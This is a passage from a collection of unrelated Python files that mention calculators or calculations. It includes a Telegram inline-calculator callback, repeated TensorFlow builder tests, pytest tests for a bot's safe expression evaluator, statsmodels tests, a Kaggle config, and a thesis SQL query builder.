    if get:\n            udB.set(\"calc\", get[:-1])\n            return await e.answer(str(get[:-1]))\n    elif x == \"%\":\n        get = udB.get(\"calc\")\n        if get:\n            udB.set(\"calc\", get + \"/100\")\n            return await e.answer(str(get + \"/100\"))\n    elif x == \"\u00f7\":\n        get = udB.get(\"calc\")\n        if get:\n            udB.set(\"calc\", get + \"/\")\n            return await e.answer(str(get + \"/\"))\n    elif x == \"x\":\n        get = udB.get(\"calc\")\n        if get:\n            udB.set(\"calc\", get + \"*\")\n            return await e.answer(str(get + \"*\"))\n    elif x == \"=\":\n        get = udB.get(\"calc\")\n        if get:\n            if get.endswith((\"*\", \".\", \"/\", \"-\", \"+\")):\n                get = get[:-1]\n            out = await calcc(get, e)\n            try:\n                num = float(out)\n                return await e.answer(f\"Answer : {num}\", cache_time=0, alert=True)\n            except BaseException:\n                udB.delete(\"calc\")\n                return await e.answer(\"Error\", cache_time=0, alert=True)\n        return await e.answer(\"None\")\n    else:\n        get = udB.get(\"calc\")\n        if get:\n            udB.set(\"calc\", get + x)\n            return await e.answer(str(get + x))\n        udB.set(\"calc\", x)\n        return await e.answer(str(x))\n\n\n@callback(\"recalc\")\n@owner\nasync def _(e):\n    m = [\n        \"AC\",\n        \"C\",\n        \"\u232b\",\n        \"%\",\n        \"7\",\n        \"8\",\n        \"9\",\n        \"+\",\n        \"4\",\n        \"5\",\n        \"6\",\n        \"-\",\n        \"1\",\n        \"2\",\n        \"3\",\n        \"x\",\n        \"00\",\n        \"0\",\n        \".\",\n        \"\u00f7\",\n    ]\n    tultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\n    lst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\n    lst.append([Button.inline(\"=\", data=\"calc=\")])\n    await e.edit(\"Noice Inline Calculator\", buttons=lst)\n", "518": "# Copyright 2017 The TensorFlow Authors. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# ==============================================================================\n\n\"\"\"Tests for region_similarity_calculator_builder.\"\"\"\n\nimport tensorflow as tf\n\nfrom google.protobuf import text_format\nfrom object_detection.builders import region_similarity_calculator_builder\nfrom object_detection.core import region_similarity_calculator\nfrom object_detection.protos import region_similarity_calculator_pb2 as sim_calc_pb2\n\n\nclass RegionSimilarityCalculatorBuilderTest(tf.test.TestCase):\n\n  def testBuildIoaSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      ioa_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IoaSimilarity))\n\n  def testBuildIouSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      iou_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IouSimilarity))\n\n  def testBuildNegSqDistSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      neg_sq_dist_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.\n                               NegSqDistSimilarity))\n\n\nif __name__ == '__main__':\n  tf.test.main()\n", "519": "# Copyright 2017 The TensorFlow Authors. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# ==============================================================================\n\n\"\"\"Tests for region_similarity_calculator_builder.\"\"\"\n\nimport tensorflow as tf\n\nfrom google.protobuf import text_format\nfrom object_detection.builders import region_similarity_calculator_builder\nfrom object_detection.core import region_similarity_calculator\nfrom object_detection.protos import region_similarity_calculator_pb2 as sim_calc_pb2\n\n\nclass RegionSimilarityCalculatorBuilderTest(tf.test.TestCase):\n\n  def testBuildIoaSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      ioa_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IoaSimilarity))\n\n  def testBuildIouSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      iou_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IouSimilarity))\n\n  def testBuildNegSqDistSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      neg_sq_dist_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.\n                               NegSqDistSimilarity))\n\n\nif __name__ == '__main__':\n  tf.test.main()\n", "520": "# Copyright 2017 The TensorFlow Authors. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# ==============================================================================\n\n\"\"\"Tests for region_similarity_calculator_builder.\"\"\"\n\nimport tensorflow as tf\n\nfrom google.protobuf import text_format\nfrom object_detection.builders import region_similarity_calculator_builder\nfrom object_detection.core import region_similarity_calculator\nfrom object_detection.protos import region_similarity_calculator_pb2 as sim_calc_pb2\n\n\nclass RegionSimilarityCalculatorBuilderTest(tf.test.TestCase):\n\n  def testBuildIoaSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      ioa_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IoaSimilarity))\n\n  def testBuildIouSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      iou_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IouSimilarity))\n\n  def testBuildNegSqDistSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      neg_sq_dist_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.\n                               NegSqDistSimilarity))\n\n\nif __name__ == '__main__':\n  tf.test.main()\n", "521": "from app.calculator import Calculator\nimport pytest\n\n\nclass TestCalculation:\n    def setup(self):\n        self.calc = Calculator\n\n    def test_multiply_calc_correct(self):\n        assert self.calc.multiply(self, 2, 2) == 4\n\n    def test_division_calc_correct(self):\n        assert self.calc.division(self, 10, 2) == 5\n\n    def test_substaction_calc_correct(self):\n        assert self.calc.subtraction(self, 8, 2) == 6\n\n    def test_adding_calc_correct(self):\n        assert self.calc.adding(self, 4, 4) == 8", "522": "import os\nimport pytest\n\ncalc = pytest.mark.calculator\n\n\n@calc('vasp')\ndef test_vasp_check_state(factory, atoms_2co):\n    \"\"\"\n    Run tests to ensure that the VASP check_state() function call works correctly,\n    i.e. correctly sets the working directories and works in that directory.\n\n    This is conditional on the existence of the VASP_COMMAND or VASP_SCRIPT\n    environment variables\n\n    \"\"\"\n\n    atoms = atoms_2co  # aliasing\n\n    # Test\n    settings = dict(xc='LDA',\n                    prec='Low',\n                    algo='Fast',\n                    ismear=0,\n                    sigma=1.,\n                    istart=0,\n                    lwave=False,\n                    lcharg=False)\n\n    s1 = atoms.get_chemical_symbols()\n\n    calc = factory.calc(**settings)\n\n    atoms.calc = calc\n\n    en1 = atoms.get_potential_energy()\n\n    # Test JSON dumping and restarting works\n    fi = 'json_test.json'\n    calc.write_json(filename=fi)\n\n    assert os.path.isfile(fi)\n\n    calc2 = factory.calc()\n    calc2.read_json(fi)\n    assert not calc2.calculation_required(atoms, ['energy', 'forces'])\n    en2 = calc2.get_potential_energy()\n    assert abs(en1 - en2) < 1e-8\n    os.remove(fi)  # Clean up the JSON file\n\n    # Check that the symbols remain in order (non-sorted)\n    s2 = calc.atoms.get_chemical_symbols()\n    assert s1 == s2\n    s3 = sorted(s2)\n    assert s2 != s3\n\n    # Check that get_atoms() doesn't reset results\n    r1 = dict(calc.results)  # Force a copy\n    calc.get_atoms()\n    r2 = dict(calc.results)\n    assert r1 == r2\n\n    # Make a parameter change to the calculator\n    calc.set(sigma=0.5)\n\n    # Check that we capture a change for float params\n    assert calc.check_state(atoms) == ['float_params']\n    assert calc.calculation_required(atoms, ['energy', 'forces'])\n\n    en2 = atoms.get_potential_energy()\n\n    # The change in sigma should result in a small change in energy\n    assert (en1 - en2) > 1e-7\n\n    # Now we make a change in input_params instead\n    calc.kpts = 2\n\n    # Check that this requires a new calculation\n    assert calc.check_state(atoms) == ['input_params']\n    assert calc.calculation_required(atoms, ['energy', 'forces'])\n\n    # Clean up\n    calc.clean()\n", "523": "import sys\n\nimport pytest\n\n\npytestmark = pytest.mark.bot(config=\"\"\"\\\n    [\"@bot\"]\n    plugins = [\"calc\"]\n    \"\"\")\n\n\ndef test_correct(bot_helper):\n    calc = bot_helper['calc']\n    assert calc._calc(\"2^6\") == \"4\"\n    assert calc._calc(\"2**6\") == \"64\"\n    assert calc._calc(\"1 + 2*3**(4^5) / (6 + -7)\") == \"-5.0\"\n    assert calc._calc(\"~5\") == \"-6\"\n    assert calc._calc(\"pi + 3\") == \"6.141592653589793\"\n    assert calc._calc(\"\") == \"You want to calculate something? Type in an expression then!\"\n    assert calc._calc(\"N\") == \"6.0221412927e+23\"\n    assert calc._calc(\"3 + \u00cf\u20ac\") == \"6.141592653589793\"  # Also tests unicode\n    assert calc._calc(\"3 < 5\") == \"True\"\n    assert calc._calc(\"3 < 5 <= 7\") == \"True\"\n    assert calc._calc(\"456 == 1\") == \"False\"\n    assert calc._calc(\"True ^ True\") == \"False\"\n    assert calc._calc(\"True + 1\") == \"2\"\n    assert calc._calc(\"~True\") == \"-2\"\n    assert calc._calc(\"2 << 31 << 31 << 31\") == \"19807040628566084398385987584\"\n    assert calc._calc(\"sin(5)\") == \"-0.9589242746631385\"\n    assert calc._calc(\"factorial(factorial(4))\") == \"620448401733239439360000\"\n\n\ndef test_error(bot_helper):\n    calc = bot_helper['calc']\n    assert calc._calc(\"9999**9999\") == \"Error, would take too long to calculate\"\n    assert calc._calc(\"1 / 0\") == \"Error, division by zero\"\n    assert calc._calc(\"1 % 0\") == \"Error, division by zero\"\n    assert calc._calc(\"1 // 0\") == \"Error, division by zero\"\n    assert calc._calc(\"1 + \") == \"Error, invalid syntax\"\n    assert calc._calc(\"e = 1\") == \"Error, invalid calculation\"\n    assert calc._calc(\"sgdsdg + 3\") == \"Error, unknown constant or function\"\n    assert calc._calc(\"2.0 << 2.0\") == \"Error, non-integer shift values\"\n    assert calc._calc(\"2.0 >> 2.0\") == \"Error, non-integer shift values\"\n    assert calc._calc(\"1 << (1 << (1 << 10))\") == \"Error, would take too long to calculate\"\n    assert calc._calc(\"5 in 5\") == \"Error, invalid operator\"\n    assert calc._calc(\"429496729 << 1000\") == \"Error, result too long to be printed\"\n    assert calc._calc(\"factorial(101)\") == \"Error, would take too long to calculate\"\n    assert calc._calc(\"2**(2 << 512)\") == \"Error, would take too long to calculate\"\n    assert calc._calc(\"factorial(ceil)\") == \"Error, invalid arguments\"\n    assert calc._calc(\"factorial(1 == 2)\"), \"Error, invalid arguments\"\n    assert calc._calc(\"(lambda x: x)(1)\") == \"Error, invalid calculation\"\n    assert calc._calc(\"10.0**1000\") == \"Error, too large to represent as float\"\n    assert calc._calc(\"'B' > 'H'\") == \"Error, invalid argument\"\n    assert calc._calc(\"e ^ pi\") == \"Error, invalid arguments\"\n    assert calc._calc(\"factorial(-42)\") == \"Error, factorial() not defined for negative values\"\n    if sys.version_info < (3, 10):\n        assert calc._calc(\"factorial(4.2)\") == \"Error, factorial() only accepts integral values\"\n    else:\n        assert calc._calc(\"factorial(4.2)\") == \"Error, invalid arguments\"\n    assert calc._calc(\"not await 1\").startswith(\"Error,\")   # ast SyntaxError in Python 3.6 but not 3.7\n    if sys.version_info < (3, 9):\n        assert calc._calc(\"(\" * 200 + \")\" * 200) == \"Error, unable to parse\"\n    assert calc._calc(\"1@2\") == \"Error, invalid operator\"\n", "524": "from __future__ import absolute_import, division, print_function\nimport cmath\nimport math\nfrom six.moves import zip\n\nclass least_squares:\n\n  def __init__(self, obs, calc):\n    self.obs = obs\n    self.calc = calc\n    a, b = self.calc.real, self.calc.imag\n    self.abs_calc = math.sqrt(a**2 + b**2)\n    self.delta = self.obs - self.abs_calc\n\n  def f(self):\n    \"Mathematica: f=(obs-Sqrt[a^2+b^2])^2\"\n    return self.delta**2\n\n  def da(self):\n    \"Mathematica: D[f,a]\"\n    if (self.abs_calc == 0): return 0\n    return -2 * self.delta * self.calc.real / self.abs_calc\n\n  def db(self):\n    \"Mathematica: D[f,b]\"\n    if (self.abs_calc == 0): return 0\n    return -2 * self.delta * self.calc.imag / self.abs_calc\n\n  def daa(self):\n    \"Mathematica: FortranForm[FullSimplify[D[f,a,a]]]\"\n    ac = self.abs_calc\n    if (ac == 0):\n      if (self.obs == 0): return 2\n      return -1.e160\n    return 2 - (2*self.calc.imag**2*self.obs)/ac/ac/ac\n\n  def dbb(self):\n    \"Mathematica: FortranForm[FullSimplify[D[f,b,b]]]\"\n    ac = self.abs_calc\n    if (ac == 0):\n      if (self.obs == 0): return 2\n      return -1.e160\n    return 2 - (2*self.calc.real**2*self.obs)/ac/ac/ac\n\n  def dab(self):\n    \"Mathematica: FortranForm[FullSimplify[D[f,a,b]]]\"\n    ac = self.abs_calc\n    if (ac == 0):\n      if (self.obs == 0): return 0\n      return 1.e160\n    return (2*self.calc.real*self.calc.imag*self.obs)/ac/ac/ac\n\nclass exp_i_alpha_sum:\n\n  def __init__(self, alphas):\n    self.alphas = alphas\n\n  def f(self):\n    \"Mathematica: f=Exp[I alpha]\"\n    result = 0\n    for alpha in self.alphas:\n      result += cmath.exp(1j*alpha)\n    return result\n\n  def d_alphas(self):\n    \"Mathematica: D[f,alpha]\"\n    return [1j*cmath.exp(1j*alpha) for alpha in self.alphas]\n\n  def d2_alphas(self):\n    \"Mathematica: D[f,alpha,alpha]\"\n    return [-cmath.exp(1j*alpha) for alpha in self.alphas]\n\n  def d_target_d_alphas(self, target):\n    \"Rule for derivatives of sum of roots of unity.\"\n    da, db = target.da(), target.db()\n    return [da * d.real + db * d.imag for d in self.d_alphas()]\n\n  def d2_target_d_alphas(self, target):\n    \"Product rule applied to da * d.real + db * d.imag.\"\n    result = []\n    da, db = target.da(), target.db()\n    daa, dbb, dab = target.daa(), target.dbb(), target.dab()\n    d = self.d_alphas()\n    d2 = self.d2_alphas()\n    for di,d2i in zip(d, d2):\n      row = []\n      for dj in d:\n        sum = daa * di.real * dj.real \\\n            + dbb * di.imag * dj.imag \\\n            + dab * (di.real * dj.imag + di.imag * dj.real)\n        if (di is dj):\n          sum += da * d2i.real + db * d2i.imag\n        row.append(sum)\n      result.append(row)\n    return result\n", "525": "# Copyright 2017 The TensorFlow Authors. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# ==============================================================================\n\n\"\"\"Tests for region_similarity_calculator_builder.\"\"\"\n\nimport tensorflow as tf\n\nfrom google.protobuf import text_format\nfrom object_detection.builders import region_similarity_calculator_builder\nfrom object_detection.core import region_similarity_calculator\nfrom object_detection.protos import region_similarity_calculator_pb2 as sim_calc_pb2\n\n\nclass RegionSimilarityCalculatorBuilderTest(tf.test.TestCase):\n\n  def testBuildIoaSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      ioa_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IoaSimilarity))\n\n  def testBuildIouSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      iou_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IouSimilarity))\n\n  def testBuildNegSqDistSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      neg_sq_dist_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.\n                               NegSqDistSimilarity))\n\n\nif __name__ == '__main__':\n  tf.test.main()\n", "526": "# Copyright 2017 The TensorFlow Authors. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# ==============================================================================\n\n\"\"\"Tests for region_similarity_calculator_builder.\"\"\"\n\nimport tensorflow as tf\n\nfrom google.protobuf import text_format\nfrom object_detection.builders import region_similarity_calculator_builder\nfrom object_detection.core import region_similarity_calculator\nfrom object_detection.protos import region_similarity_calculator_pb2 as sim_calc_pb2\n\n\nclass RegionSimilarityCalculatorBuilderTest(tf.test.TestCase):\n\n  def testBuildIoaSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      ioa_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IoaSimilarity))\n\n  def testBuildIouSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      iou_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IouSimilarity))\n\n  def testBuildNegSqDistSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      neg_sq_dist_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.\n                               NegSqDistSimilarity))\n\n\nif __name__ == '__main__':\n  tf.test.main()\n", "527": "import numpy as np\nfrom numpy.testing import assert_equal, assert_\nfrom statsmodels.stats.regularized_covariance import _calc_nodewise_row, _calc_nodewise_weight, _calc_approx_inv_cov, RegularizedInvCovariance\n\n\ndef test_calc_nodewise_row():\n\n    np.random.seed(435265)\n    X = np.random.normal(size=(50, 3))\n    ghat = _calc_nodewise_row(X, 0, 0.01)\n    assert_equal(ghat.shape, (2,))\n\n\ndef test_calc_nodewise_weight():\n\n    np.random.seed(435265)\n    X = np.random.normal(size=(50, 3))\n    ghat = np.random.normal(size=2)\n    that = _calc_nodewise_weight(X, ghat, 0, 0.01)\n    assert_(isinstance(that, float))\n\n\ndef test_calc_approx_inv_cov():\n\n    np.random.seed(435265)\n    X = np.random.normal(size=(50, 3))\n    ghat_l = []\n    that_l = []\n    for i in range(3):\n        ghat = _calc_nodewise_row(X, i, 0.01)\n        that = _calc_nodewise_weight(X, ghat, i, 0.01)\n        ghat_l.append(ghat)\n        that_l.append(that)\n    theta_hat = _calc_approx_inv_cov(np.array(ghat_l), np.array(that_l))\n    assert_equal(theta_hat.shape, (3, 3))\n\n\ndef test_fit():\n\n    np.random.seed(435265)\n    X = np.random.normal(size=(50, 3))\n    inv = np.linalg.inv(np.cov(X.T))\n    regcov = RegularizedInvCovariance(exog=X)\n    regcov.fit()\n    # check that unregularized is what we expect\n    diff = np.linalg.norm(regcov.approx_inv_cov() - inv)\n    assert_(diff < 0.1)\n\n    # check that regularizing actually does something\n    regcov.fit(alpha=0.5)\n    assert_(np.sum(regcov.approx_inv_cov() == 0) > np.sum(inv == 0))\n", "528": "TRAIN_FILE = \"data/train.csv\"\nTEST_FILE = \"data/test.csv\"\n\nSUB_DIR = \"output\"\n\n\nNUM_SPLITS = 3\nRANDOM_SEED = 2017\n\n# types of columns of the dataset dataframe\nCATEGORICAL_COLS = [\n    # 'ps_ind_02_cat', 'ps_ind_04_cat', 'ps_ind_05_cat',\n    # 'ps_car_01_cat', 'ps_car_02_cat', 'ps_car_03_cat',\n    # 'ps_car_04_cat', 'ps_car_05_cat', 'ps_car_06_cat',\n    # 'ps_car_07_cat', 'ps_car_08_cat', 'ps_car_09_cat',\n    # 'ps_car_10_cat', 'ps_car_11_cat',\n]\n\nNUMERIC_COLS = [\n    # # binary\n    # \"ps_ind_06_bin\", \"ps_ind_07_bin\", \"ps_ind_08_bin\",\n    # \"ps_ind_09_bin\", \"ps_ind_10_bin\", \"ps_ind_11_bin\",\n    # \"ps_ind_12_bin\", \"ps_ind_13_bin\", \"ps_ind_16_bin\",\n    # \"ps_ind_17_bin\", \"ps_ind_18_bin\",\n    # \"ps_calc_15_bin\", \"ps_calc_16_bin\", \"ps_calc_17_bin\",\n    # \"ps_calc_18_bin\", \"ps_calc_19_bin\", \"ps_calc_20_bin\",\n    # numeric\n    \"ps_reg_01\", \"ps_reg_02\", \"ps_reg_03\",\n    \"ps_car_12\", \"ps_car_13\", \"ps_car_14\", \"ps_car_15\",\n\n    # feature engineering\n    \"missing_feat\", \"ps_car_13_x_ps_reg_03\",\n]\n\nIGNORE_COLS = [\n    \"id\", \"target\",\n    \"ps_calc_01\", \"ps_calc_02\", \"ps_calc_03\", \"ps_calc_04\",\n    \"ps_calc_05\", \"ps_calc_06\", \"ps_calc_07\", \"ps_calc_08\",\n    \"ps_calc_09\", \"ps_calc_10\", \"ps_calc_11\", \"ps_calc_12\",\n    \"ps_calc_13\", \"ps_calc_14\",\n    \"ps_calc_15_bin\", \"ps_calc_16_bin\", \"ps_calc_17_bin\",\n    \"ps_calc_18_bin\", \"ps_calc_19_bin\", \"ps_calc_20_bin\"\n]\n", "529": "#!/d/msc/s/anaconda/v5.3.0/bin/python\n\"\"\"\nAuthor:    Rachel Alcraft\nDate:      13/06/2020\nFunction:  All sql strings created here\nDescription:\n============\n\"\"\"\n\nimport thesis_config as cfg\n\n# ************************************************************************************************\n\ndef sqlForHistOpt(calc,set_name,maxb,restriction,amino_code,res,rvalue,rfree,resL,rvalueL,rfreeL):\n\n    # allow calc to be N-CA or N.CA or N_CA and convert it\n    calc = calc.replace(\".\",\"_\")\n    calc = calc.replace(\"-\",\"_\")\n\n\n    res_constraint = \"\"\n    if res != \"ALL\":\n        res_constraint =  \"AND p.resolution < \" + res + \"\\n\"\n    rval_constraint = \"\"\n    if rvalue != \"ALL\":\n        rval_constraint =  \"AND p.rvalue < \" +  rvalue + \"\\n\"\n    rfree_constraint = \"\"\n    if rfree != \"ALL\":\n        rfree_constraint =  \"AND p.rfree < \" + rfree + \"\\n\"\n\n    res_constraintL = \"\"\n    if resL != \"ALL\":\n        res_constraintL =  \"AND p.resolution >= \" + resL + \"\\n\"\n    rval_constraintL = \"\"\n    if rvalueL != \"ALL\":\n        rval_constraintL =  \"AND p.rvalue >= \" +  rvalueL + \"\\n\"\n    rfree_constraintL = \"\"\n    if rfreeL != \"ALL\":\n        rfree_constraintL =  \"AND p.rfree >= \" + rfreeL + \"\\n\"\n\n    bfactor_restraint = \"\"\n    if maxb != '':\n        bfactor_restraint = \"AND p.bfactor < \" + maxb + \" \\n\"\n\n    amino_restraint = \"\"\n    if amino_code != \"NON\":\n        amino_restraint = \"AND g.amino_code = '\" + amino_code + \"' \\n\"\n\n    html = \"\"\n\n    html += \"SELECT g.pdb_code, \" + calc + \" as geo, g.atoms_\" + calc + \" as atoms, g.aminos_\" + calc + \" as aminos \\n\"\n    #html += \"from geo_core g, protein_set_c s, protein_structure_c p \\n\"\n    html += \"from \" + cfg.tableCore + \" g, \" + cfg.tableSet + \" s, \" + cfg.tablePdb + \" p \\n\"\n    html += \"WHERE \" + calc + \" IS NOT NULL\\n\"\n    html += \"AND s.pdb_code = g.pdb_code\\n\"\n    html += \"AND s.pdb_code = p.pdb_code\\n\"\n    html += \"AND g.pdb_code = p.pdb_code\\n\"\n    html += \"AND g.occupant = 'A'\\n\"\n    html += \"AND s.status = 'IN'\\n\"\n    html += bfactor_restraint\n    html += amino_restraint\n    html += \"AND s.set_name = '\" + set_name + \"'\\n\"\n    html += res_constraint + rval_constraint + rfree_constraint\n    html += res_constraintL + rval_constraintL + rfree_constraintL\n    html += restriction\n    html += \" ORDER BY geo ASC;\"\n    return (html)\n# ************************************************************************************************\n\ndef sqlForHistContact(calc,set_name,maxb,restriction, amino_code,res,rvalue,rfree,resL,rvalueL,rfreeL):\n\n    # allow calc to be N-CA or N.CA or N_CA and convert it\n    calc = calc.replace(\".\",\"-\")\n    calc = calc.replace(\"_\",\"-\")\n\n\n    res_constraint = \"\"\n    if res != \"ALL\":\n        res_constraint =  \"AND p.resolution < \" + res + \"\\n\"\n    rval_constraint = \"\"\n    if rvalue != \"ALL\":\n        rval_constraint =  \"AND p.rvalue < \" +  rvalue + \"\\n\"\n    rfree_constraint = \"\"\n    if rfree != \"ALL\":\n        rfree_constraint =  \"AND p.rfree < \" + rfree + \"\\n\"\n\n    amino_restraint = \"\"\n    if amino_code != \"NON\":\n        amino_restraint += \"AND g.amino_code = '\" + amino_code + \"'\\n\"\n\n    res_constraintL = \"\"\n    if resL != \"ALL\":\n        res_constraintL =  \"AND p.resolution >= \" + resL + \"\\n\"\n    rval_constraintL = \"\"\n    if rvalueL != \"ALL\":\n        rval_constraintL =  \"AND p.rvalue >= \" +  rvalueL + \"\\n\"\n    rfree_constraintL = \"\"\n    if rfreeL != \"ALL\":\n        rfree_constraintL =  \"AND p.rfree >= \" + rfreeL + \"\\n\"\n\n    bfactor_restraint = \"\"\n    if maxb != '':\n        bfactor_restraint = \"AND p.bfactor < \" + maxb + \" \\n\"\n\n    html = \"\"\n\n    html += \"SELECT g.pdb_code, g.geo_value as geo, g.geo_atoms as atoms \\n\"\n    #html += \"from geo_contact g, protein_set_c s, protein_structure_c p \\n\"\n    html += \"from \" + cfg.tableContact + \" g, \" + cfg.tableSet + \" s, 